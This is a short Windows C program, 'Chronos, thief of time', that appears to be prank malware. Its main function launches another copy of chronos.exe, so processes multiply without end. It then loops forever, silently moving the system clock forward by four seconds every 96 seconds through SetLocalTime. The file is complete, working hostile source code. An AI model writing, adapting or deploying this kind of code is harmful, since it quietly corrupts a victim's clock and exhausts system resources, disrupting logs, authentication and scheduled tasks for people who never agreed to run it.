#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
 
/*
 * Chronos, thief of time
 * Version: 0.0.0
 */

#define INTERVAL 96000
#define STEALTIME 4

// Global time structure
SYSTEMTIME chronos_time;


// Steal time
void steal(void);

 
int main(int argc, char *argv[]){
    system("START .\\chronos.exe");
    /* Main loop */
    while(1){
        /* Steal time each time */
        steal();
        Sleep(INTERVAL);
    }
    return 0;
}


void steal(void){
    /*
     * Steal time
     */
    time_t delay = time(NULL); // Delay of actions
    unsigned short int test=0;
    test = 0;
    do{ // Wait that seconds is small
        if(test>0){
            Sleep(10000);
        }else{
            test++;
        }
        GetLocalTime(&chronos_time);
        delay=time(NULL);
    }while(chronos_time.wSecond > 50);
    chronos_time.wSecond += STEALTIME; // Steal time
    SetLocalTime(&chronos_time); // Set new time
}
